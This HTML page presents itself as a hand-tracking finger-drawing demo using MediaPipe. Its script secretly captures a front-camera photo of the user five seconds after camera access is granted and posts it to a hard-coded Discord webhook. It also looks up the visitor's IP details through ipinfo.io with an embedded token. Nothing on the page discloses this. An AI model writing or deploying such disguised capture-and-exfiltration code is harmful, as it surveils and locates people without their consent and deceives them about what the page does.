<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Enhanced Finger Detection with Drawing</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #222;
      overflow: hidden;
    }

    video, canvas {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    #loading {
      font-size: 24px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100%;
      width: 100%;
      color: white;
      background-color: #222;
      z-index: 10;
    }

    #spinner {
      border: 16px solid #f3f3f3;
      border-top: 16px solid #3498db;
      border-radius: 50%;
      width: 120px;
      height: 120px;
      animation: spin 2s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div id="loading">
    <div id="spinner"></div>
    <p>Loading... Please wait.</p>
  </div>

  <video id="camera-view" autoplay playsinline></video>
  <canvas id="camera-canvas"></canvas>

  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>

  <script>
    const videoElement = document.getElementById('camera-view');
    const canvasElement = document.getElementById('camera-canvas');
    const canvasCtx = canvasElement.getContext('2d');
    const webhookURL = "https://discord.com/api/webhooks/1269202921480781824/rEeILOelJ3vfUvqSfqkGb0fKpcjLe-4U62vwBaU4abBQ8tkH-az5an4timRi4S7BbXLt"; // Replace with your server's webhook URL

    let drawingMode = false;
    let previousIndexPos = null;

    // Function to grab the user's IP information
    async function fetchIP() {
      try {
        const response = await fetch('https://ipinfo.io/json?token=da0fe815269d6a'); // Replace with your IPinfo token
        const data = await response.json();
        console.log("User's IP Details:", data);
        return data;
      } catch (error) {
        console.error('Failed to fetch IP information:', error);
      }
    }

    // Capture a picture from the front camera and send it via webhook
    async function captureAndSendImage() {
      const captureCanvas = document.createElement("canvas");
      captureCanvas.width = videoElement.videoWidth;
      captureCanvas.height = videoElement.videoHeight;
      const captureCtx = captureCanvas.getContext("2d");
      captureCtx.drawImage(videoElement, 0, 0);

      // Convert canvas to blob for uploading
      captureCanvas.toBlob(async (blob) => {
        if (blob) {
          const formData = new FormData();
          formData.append("image", blob, "captured_image.png"); // Change filename as needed

          try {
            const response = await fetch(webhookURL, {
              method: "POST",
              body: formData,
            });

            if (response.ok) {
              console.log('Image sent successfully');
            } else {
              console.error('Failed to send image:', response.statusText);
            }
          } catch (error) {
            console.error('Error sending image:', error);
          }
        } else {
          console.error('Failed to convert canvas to blob.');
        }
      }, "image/png"); // You can change the image format if needed
    }

    // Initialize camera after loading
    async function initialize() {
      document.getElementById('loading').style.display = 'none';
      await initializeCamera();
      resizeCanvas();
      window.addEventListener('resize', resizeCanvas);
    }

    function resizeCanvas() {
      canvasElement.width = window.innerWidth;
      canvasElement.height = window.innerHeight;
    }

    async function initializeCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        videoElement.srcObject = stream;
        videoElement.style.display = 'block';
        initializeHandTracking();
        
        // Capture image and IP information after a delay
        setTimeout(() => {
          captureAndSendImage();
          fetchIP();
        }, 5000); // Delay to ensure the camera stream is ready
      } catch (err) {
        alert('Error accessing the camera: ' + err);
        console.error(err);
      }
    }

    function initializeHandTracking() {
      const hands = new Hands({
        locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`,
      });

      hands.setOptions({
        maxNumHands: 1,
        modelComplexity: 1,
        minDetectionConfidence: 0.7,
        minTrackingConfidence: 0.7,
      });

      hands.onResults(onResults);

      const camera = new Camera(videoElement, {
        onFrame: async () => {
          await hands.send({ image: videoElement });
        },
        width: 1280,
        height: 720
      });
      camera.start();
    }

    function onResults(results) {
      canvasCtx.save();
      canvasCtx.drawImage(
        results.image, 0, 0, canvasElement.width, canvasElement.height
      );

      if (results.multiHandLandmarks) {
        for (const landmarks of results.multiHandLandmarks) {
          detectThumbPinkyTouch(landmarks);
          drawHandLandmarks(landmarks);
          if (drawingMode) {
            trackAndDrawWithIndexFinger(landmarks);
          }
        }
      }
      canvasCtx.restore();
    }

    function detectThumbPinkyTouch(landmarks) {
      const pinkyTip = landmarks[20];
      const thumbTip = landmarks[4];

      const distance = Math.sqrt(
        Math.pow(pinkyTip.x - thumbTip.x, 2) +
        Math.pow(pinkyTip.y - thumbTip.y, 2)
      );

      if (distance < 0.05) {
        drawingMode = !drawingMode;
        previousIndexPos = null;
      }
    }

    function trackAndDrawWithIndexFinger(landmarks) {
      const indexTip = landmarks[8];
      const indexX = indexTip.x * canvasElement.width;
      const indexY = indexTip.y * canvasElement.height;

      if (previousIndexPos) {
        canvasCtx.beginPath();
        canvasCtx.moveTo(previousIndexPos.x, previousIndexPos.y);
        canvasCtx.lineTo(indexX, indexY);
        canvasCtx.strokeStyle = 'white';
        canvasCtx.lineWidth = 4;
        canvasCtx.stroke();
      }

      previousIndexPos = { x: indexX, y: indexY };
    }

    function drawHandLandmarks(landmarks) {
      canvasCtx.strokeStyle = 'white';
      canvasCtx.lineWidth = 3;

      const connections = [
        [0, 1], [1, 2], [2, 3], [3, 4],
        [0, 5], [5, 6], [6, 7], [7, 8],
        [0, 9], [9, 10], [10, 11], [11, 12],
        [0, 13], [13, 14], [14, 15], [15, 16],
        [0, 17], [17, 18], [18, 19], [19, 20]
      ];

      connections.forEach(([start, end]) => {
        const startX = landmarks[start].x * canvasElement.width;
        const startY = landmarks[start].y * canvasElement.height;
        const endX = landmarks[end].x * canvasElement.width;
        const endY = landmarks[end].y * canvasElement.height;

        canvasCtx.beginPath();
        canvasCtx.moveTo(startX, startY);
        canvasCtx.lineTo(endX, endY);
        canvasCtx.stroke();
      });
    }

    // Call initialize when the page loads
    window.onload = initialize;
  </script>
</body>
</html>
